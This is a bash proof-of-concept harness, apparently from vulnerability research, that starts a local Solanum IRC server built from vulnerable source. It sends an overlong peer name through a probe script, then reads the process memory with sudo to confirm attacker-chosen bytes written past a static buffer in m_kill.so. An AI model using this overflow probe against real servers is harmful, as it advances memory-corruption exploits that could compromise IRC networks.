#!/bin/bash
# One-shot plain (no-ASan) real-ircd layout probe. Loopback only.
# Requires the prefix-correct plain install at /tmp/solanum-plainfx:
#   meson setup real-build/plain-build real-build/vuln-src \
#     -Dbuildtype=debug -Db_sanitize=none -Db_lundef=false \
#     -Dopenssl=enabled -Dgnutls=disabled -Dmbedtls=disabled \
#     --prefix /tmp/solanum-plainfx
#   ninja -C real-build/plain-build && DESTDIR=/ ninja -C real-build/plain-build install
# Reads chosen bytes past the static buf (ELF vaddr 0x5220 in m_kill.so,
# RW segment starts at vaddr 0x5000 => mapping base + 0x220).
set -u
cd "$(dirname "$0")" || exit 2
P=$PWD
TAG=${1:-layout-probe}
pkill -9 -f '/tmp/solanum-plainfx/bin/solanum' 2>/dev/null
/tmp/solanum-plainfx/bin/solanum -configfile "$P/vuln.conf" -foreground \
  -logfile "$P/$TAG-ircd.log" -pidfile "$P/$TAG.pid" >"$P/$TAG-stdout.log" 2>&1 &
PID=$!
sleep 3
PEER_NAME="link.aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa." \
PEER_SID=2AB VICTIM_NICK=v KILL_PATH=x \
  python3 peer_probe.py 17601 490 "$TAG" >"probe-$TAG.out" 2>&1
LINE=$(grep 'm_kill.so' /proc/$PID/maps | grep 'rw-p' | head -1)
if [ -z "$LINE" ]; then echo "NO m_kill.so RW mapping"; kill -9 $PID 2>/dev/null; exit 1; fi
sudo -n python3 - "$PID" "$LINE" "$TAG" <<'PY'
import sys
pid=int(sys.argv[1]); line=sys.argv[2]; tag=sys.argv[3]
start=int(line.split()[0].split('-')[0],16)
addr=start+0x220
with open(f'/proc/{pid}/mem','rb') as f:
    f.seek(addr); data=f.read(0x400)
oob=0
for i,c in enumerate(data[512:],512):
    if c != 0: oob=i
print(f'buf={hex(addr)} bytes_nonzero_through_offset={oob} '
      f'chosen_A_past_buf={data[512:512+51].count(65)}/51')
print('buf+0200:', data[0x200:0x210].hex(' '))
print('buf+0210:', data[0x210:0x220].hex(' '))
print('buf+0220:', data[0x220:0x230].hex(' '))
print('buf+0230:', data[0x230:0x240].hex(' '))
PY
kill -9 $PID 2>/dev/null
